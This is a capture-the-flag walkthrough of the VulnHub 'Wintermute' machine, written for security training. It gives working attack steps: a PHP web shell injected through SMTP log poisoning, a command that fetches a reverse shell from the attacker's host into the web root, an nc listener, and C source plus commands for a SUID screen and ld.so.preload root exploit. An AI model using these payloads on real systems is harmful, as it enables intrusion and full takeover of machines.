# Wintermute — VulnHub Writeup

**Difficulty:** Intermediate
**Platform:** [VulnHub](https://download.vulnhub.com/wintermute/Wintermute-v1.zip)
**Category:** Web Exploitation, Log Poisoning (LFI → RCE), Linux Privilege Escalation (SUID)

## Overview

Wintermute is a Linux-based vulnerable machine that simulates a small internal network monitoring application. The attack path covers open port enumeration, exploitation of a Local File Inclusion (LFI) vulnerability combined with SMTP log poisoning to achieve Remote Code Execution (RCE), and privilege escalation to root via a misconfigured SUID binary.

**Skills demonstrated:**
- Network reconnaissance and service enumeration (Nmap)
- SMTP log poisoning for LFI-to-RCE
- Reverse shell deployment and TTY upgrade
- Linux privilege escalation via SUID binary abuse
- Custom C payload compilation for privilege escalation

---

## 1. Reconnaissance

Identified the target machine's IP address on the local network using Netdiscover.

![Netdiscover scan](screenshots/image1.png)
![Target IP identified](screenshots/image2.png)

## 2. Port Scanning

Ran an Nmap scan against the target to enumerate open ports and running services.

![Nmap scan results](screenshots/image5.png)

Two relevant ports were identified:
- **Port 25** — SMTP (mail service)
- **Port 3000** — Web application

Port 25 was restricted from direct interaction, but port 3000 hosted a login page.

![Login page on port 3000](screenshots/image6.png)
![Web application on port 3000](screenshots/image7.png)

## 3. Initial Access — Default Credentials

The application's login page hinted at default credentials (`admin` / `admin`), which granted access to the dashboard.

![Successful login with default credentials](screenshots/image8.png)

## 4. Application Enumeration

Browsing the dashboard revealed a network-monitoring interface with two discoverable paths: `/turing-bolo` and `/freeside`.

![Discovered application paths](screenshots/image9.png)
![Turing-bolo interface](screenshots/image10.png)
![Freeside interface](screenshots/image11.png)

Further exploration surfaced a "case" option that changed the URL structure, revealing that the application could load user log files based on a URL parameter.

![Case option in the application](screenshots/image12.png)
![URL parameter change on case selection](screenshots/image13.png)

## 5. Local File Inclusion (LFI)

Given the presence of an SMTP service, the mail log file (`/var/log/mail`) was tested as an LFI target — and successfully retrieved.

![Mail log file read via LFI](screenshots/image14.png)

This suggested a classic **log poisoning** opportunity: since the application could read the SMTP log, any content injected into that log via a raw SMTP session — including PHP code — could potentially be executed by the LFI vulnerability.

## 6. SMTP Log Poisoning

Connected to the SMTP service via Telnet and stepped through a manual SMTP session:

```
EHLO hacker
MAIL FROM: <hacker@test.com>
RCPT TO: root
DATA
```

![Manual SMTP session via Telnet](screenshots/image15.png)

- `EHLO` — greets the mail server, identifying the client (the modern equivalent of `HELO`)
- `MAIL FROM` — declares the sender address
- `RCPT TO` — declares the recipient
- `DATA` — begins the message body; a single `.` on its own line signals the end of the message

Sending a test message confirmed that message content was written directly into `/var/log/mail`.

![Test mail entry appearing in the log](screenshots/image16.png)

A second message was then crafted with a PHP web shell payload injected into the `RCPT TO` field:

```
MAIL FROM: <mail@mail.com>
RCPT TO: <?php system($_GET['cmd']); ?>
```

![PHP payload injected into SMTP session](screenshots/image17.png)

The payload was confirmed present in the log file. Requesting the LFI endpoint with the log file path and a `cmd` parameter executed the injected PHP code, confirming **LFI-to-RCE**:

```
http://10.0.2.13/turing-bolo/bolo.php?bolo=../../../../../var/log/mail&cmd=whoami
```

![RCE confirmed via whoami](screenshots/image18.png)

Output confirmed code execution as `www-data`. Further command execution confirmed access to `/etc/passwd`, revealing two notable local users: `wintermute` and `turing-police`.

![Reading /etc/passwd via RCE](screenshots/image19.png)
![Command execution confirming current user](screenshots/image20.png)

## 7. Establishing a Reverse Shell

Manually issuing commands through the URL parameter was slow, so a PHP reverse shell ([pentestmonkey's php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)) was downloaded, configured with the attacker's IP/port, and renamed to avoid detection:

```bash
wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
nano php-reverse-shell.php   # set attacker IP/port
mv php-reverse-shell.php reversemonkey.txt
python3 -m http.server 8080
```

![Reverse shell prepared and served](screenshots/image21.png)
![HTTP server hosting the payload](screenshots/image22.png)

The payload was pulled onto the target via the RCE primitive, saved with a `.php` extension inside the web root, and made executable:

```
...&cmd=wget http://10.0.2.5:8080/reversemonkey.txt -O /var/www/html/turing-bolo/reversemonkey.php
...&cmd=chmod 755 /var/www/html/turing-bolo/reversemonkey.php
```

A listener was started on the attacker machine:

```bash
nc -lvnp 4444
```

Triggering the uploaded script via the browser returned a shell connection to the listener.

![Reverse shell connection received](screenshots/image23.png)

The shell was upgraded to a full TTY for usability:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 8. Privilege Escalation — SUID Enumeration

With a foothold as `www-data`, the next step was identifying a path to root. Common privilege escalation vectors were considered: SUID binaries, `sudo -l`, cron jobs.

Searched for SUID binaries:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

![SUID binary enumeration results](screenshots/image24.png)

Most binaries found were not exploitable (`su`, `passwd`, `ping`), but **`screen`** stood out. A binary with the SUID bit set is not automatically exploitable — it depends on the binary's version, its exposed functionality, and whether it can be leveraged to write to arbitrary files. In this case, the installed `screen` version was vulnerable to a known privilege escalation technique.

## 9. Exploiting SUID `screen`

**Step 1 — Malicious shared library.** A C payload was written that, once loaded, takes ownership of a target binary and grants it SUID permissions:

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

Compiled as a shared object:

```bash
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
```

**Step 2 — Root shell binary.** A minimal C program that drops into a root shell when executed with elevated privileges:

```c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

Compiled with:

```bash
gcc -o /tmp/rootshell /tmp/rootshell.c
```

![Compiling the privilege escalation payloads](screenshots/image25.png)

**Step 3 — Trigger via `screen`.** With `umask 000` set to ensure newly created files were world-writable, the SUID `screen` binary was abused to write the malicious library's path into `/etc/ld.so.preload` — a file that, when populated, causes the dynamic linker to load the specified library into every subsequently executed process:

```bash
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
```

![Writing to /etc/ld.so.preload via screen](screenshots/image26.png)

Once any process loaded `/tmp/libhax.so`, it silently granted `/tmp/rootshell` the SUID bit and root ownership. Executing `/tmp/rootshell` then dropped into a root-owned shell:

```bash
/tmp/rootshell
```

![Root shell obtained](screenshots/image27.png)

The shell was upgraded again for stability:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 10. Root Flag

```
384ghsw4jth390hgwo49t02jv92348gh
```

![Root access and flag captured](screenshots/image28.png)

---

## Summary

| Stage | Technique |
|---|---|
| Recon | Netdiscover, Nmap |
| Initial Access | Default credentials on web login |
| Foothold | LFI + SMTP log poisoning → RCE as `www-data` |
| Shell Upgrade | PHP reverse shell, TTY upgrade |
| Privilege Escalation | SUID `screen` binary → `/etc/ld.so.preload` hijack → root |

## Key Takeaways

- **Default credentials remain a common entry point** — even on internal monitoring tools.
- **Log poisoning is a powerful LFI-to-RCE technique** when an application can both write attacker-controlled content into a log (e.g. via SMTP) and read arbitrary files.
- **SUID binaries require context, not just discovery.** A binary having the SUID bit does not guarantee exploitability — version, functionality, and file-write capability all matter.
- **`/etc/ld.so.preload` is a high-impact target** for privilege escalation once arbitrary file write is achieved, since it affects every subsequently loaded process.

---

*This writeup documents a walkthrough of a deliberately vulnerable machine intended for security training purposes (VulnHub). All techniques were applied in an isolated lab environment.*
